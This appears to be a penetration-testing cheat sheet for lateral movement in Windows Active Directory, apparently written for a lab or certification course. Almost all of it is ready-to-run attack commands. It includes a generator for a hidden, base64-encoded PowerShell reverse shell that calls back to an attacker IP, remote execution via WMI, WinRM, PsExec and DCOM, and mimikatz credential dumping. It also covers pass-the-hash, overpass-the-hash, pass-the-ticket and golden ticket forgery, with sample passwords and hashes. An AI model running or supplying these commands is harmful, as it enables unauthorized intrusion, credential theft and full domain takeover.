#### Use Wmi
*require Administrators local group, and login as a user in the compromised host, run this to make it for the target host\.*

*through Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.*
###### Rev_shell as base64
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

###### CMD
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
//change the payload command as rev shell to get a shell
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell -nop -w hidden -e JABjAGwAaQ<snip>"

```


###### PS
```
//create the credential
$username = 'jen';

$password = 'Nexus123!';

$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

//create session

$options = New-CimSessionOption -Protocol DCOM

$session = New-Cimsession -ComputerName 192.168.123.72 -Credential $credential -SessionOption $Options

$command = 'calc'

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}
```

#### Use Winrm
*uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.*
###### CMD
`winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"`
//replace command 

###### PS

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

//create a session other than revshell

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

> Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
> -- ----            ------------    ------------    -----         -----------------     ------------
>  1 WinRM1          192.168.123.72  RemoteMachine   Opened        Microsoft.PowerShell     Available

Enter-PSSession 1
```

#### PsExec
- the user that authenticates to the target machine needs to be part of the Administrators local group.
- the ADMIN$ share must be available
- File and Printer Sharing has to be turned on.
the last two requirements are already met as they are the default settings on modern Windows Server systems.
//From compromised host to target one

`.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`

#### PtH
- it requires an SMB connection through the firewall (commonly port 445)
- the Windows File and Printer Sharing feature to be enabled.
- the admin share called ADMIN$ to be available

```
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:25d55ad283aa400af464c76d713c07ad /run:cmd.exe"

PsExec.exe \\192.168.1.10 cmd.exe

//or from Kali
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

#### Overpass the hash
*turn the NTLM hash into a Kerberos ticket*
*we owned user1, and login a host, where user2 cache hash there, we grab hash via mimikatz*
```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:user2 /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

//now have a shell with priv of user2. if user2 have admin of host2, authenticate it 
net use \\host2
klist
//use this TGT to login
.\PsExec.exe \\host2 cmd

```
#### Ptt - pass the ticket
Export local ticket
```
privilege::debug

sekurlsa::tickets /export
```
re-inject ticket
```
dir *.kirbi
//find a ticket we need, with teh user and whose privi we want

kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

klist
```

#### DCOM
*DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager*
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

tasklist | findstr "calc"
```
//We can also set a revshell into cmd

#### Golden Ticket

```
privilege::debug

//get the user krbtgt hash
lsadump::lsa /patch

kerberos::purge

//provide a user, SID 
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

misc::cmd

PsExec.exe \\dc1 cmd.exe
```
